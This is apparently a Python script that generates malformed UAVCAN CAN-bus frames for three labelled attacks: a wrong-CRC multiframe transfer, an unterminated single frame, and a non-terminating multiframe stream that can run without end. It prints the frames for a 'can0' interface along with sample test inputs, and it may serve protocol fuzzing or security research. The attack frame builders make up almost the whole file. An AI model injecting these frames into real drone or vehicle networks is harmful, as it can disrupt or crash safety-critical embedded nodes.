from UAVCAN.AID     import UAVCAN_AID
from UAVCAN.PAYLOAD import UAVCAN_PAYLOAD

# pip3 install python-can
import can


class CAN:
    def build(interface, can_id, payload):
        return f'{interface}  {can_id}   [{ len(payload.split(" ")) }]  {payload}'


class attack:
    # send multiframe message with wrong CRC
    def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
        payload = payload.split(' ')

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        if len(payload) < 6:
            if padding: payload += ["00" for _ in range(5 - len(payload))]
            print(CAN.build(
                    'can0', 
                    10015501, 
                    f'{CRC} {" ".join(payload)}' +
                    UAVCAN_PAYLOAD.tail(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                        )
                    )
                )
        else:
            print(CAN.build(
                    'can0', 
                    10015501, 
                    f'{CRC} {" ".join(payload[ : 5 ])}' +
                    UAVCAN_PAYLOAD.tail(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                        )
                    )
                )
            payload = payload[ 5 : ]

            transfer_start  = 0b0
            while len(payload) > 7:
                toggle ^= 0b1
                print(CAN.build(
                        'can0',
                        10015501,
                        " ".join(payload[ : 7 ]) + 
                        UAVCAN_PAYLOAD.tail(
                            transfer_start, 
                            transfer_end, 
                            toggle, 
                            transfer_ID
                            )
                        )
                    )

                payload = payload[ 7 : ]

            transfer_end = 0b1
            toggle ^= 0b1
            print(CAN.build(
                'can0', 
                10015501, 
                " ".join(payload) + 
                UAVCAN_PAYLOAD.tail(
                    transfer_start, 
                    transfer_end, 
                    toggle, 
                    transfer_ID
                    )
                )
            )

        print()

    def wrong_CRC_test(self):
        print("''' wrong CRC attack sample input '''")
        self.wrong_CRC('A1 A2', 'C1', False)    
        self.wrong_CRC('A1 A2', 'C1 C2')
        self.wrong_CRC('A1 A2', 'C1 C2 C3')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4')
        self.wrong_CRC('A1 A2', 'C1 C2 C3 C4 C5')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0')
        self.wrong_CRC('A1 A2', 'B1 B2 B3 B4 B5 B6 B7 B8 B9 B0 B0 B0 B0')

        self.wrong_CRC('A1 A2', 'B1 B2 B3 B5 B5 B6 B7 B8 B9 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0 B0')

    # send singleframe message with open end
    def wrong_END(self, payload = 'BB BB BB BB', padding = True):
        payload = payload.split(' ')

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        if padding: payload += ["00" for _ in range(7 - len(payload))]
        print(CAN.build(
                'can0', 
                10015501, 
                f'{" ".join(payload)}' + 
                UAVCAN_PAYLOAD.tail(
                    transfer_start, 
                    transfer_end, 
                    toggle, 
                    transfer_ID
                    )
                )
            )

        print()

    def wrong_END_test(self):
        print("''' wrong end attack sample input '''")
        self.wrong_END('C1', False)    
        self.wrong_END('C1 C2')
        self.wrong_END('C1 C2 C3')
        self.wrong_END('C1 C2 C3 C4')
        self.wrong_END('C1 C2 C3 C4 C5')

        self.wrong_END('B1 B2 B3 B4 B5 B6')
        self.wrong_END('B1 B2 B3 B4 B5 B6 B7')

    # send multiframe message without termination
    def nonTERMINATE(counter = -1):
        print("''' non terminate attack '''")

        transfer_start  = 0b1
        transfer_end    = 0b0
        toggle          = 0b0
        transfer_ID     = 0b00000

        print(CAN.build(
                'can0', 
                10015501, 
                UAVCAN_PAYLOAD.random() +
                UAVCAN_PAYLOAD.tail(
                    transfer_start, 
                    transfer_end, 
                    toggle, 
                    transfer_ID
                    )
                )
            )

        transfer_start  = 0b0
        while counter:
            toggle ^= 0b1
            print(CAN.build(
                    'can0',
                    10015501,
                    UAVCAN_PAYLOAD.random() + 
                    UAVCAN_PAYLOAD.tail(
                        transfer_start, 
                        transfer_end, 
                        toggle, 
                        transfer_ID
                        )
                    )
                )
            if counter != -1: counter -= 1

def main():
    attack().wrong_CRC_test()
    attack().wrong_END_test()

    # attack.nonTERMINATE()
    attack.nonTERMINATE(10)


if __name__ == "__main__":
    main()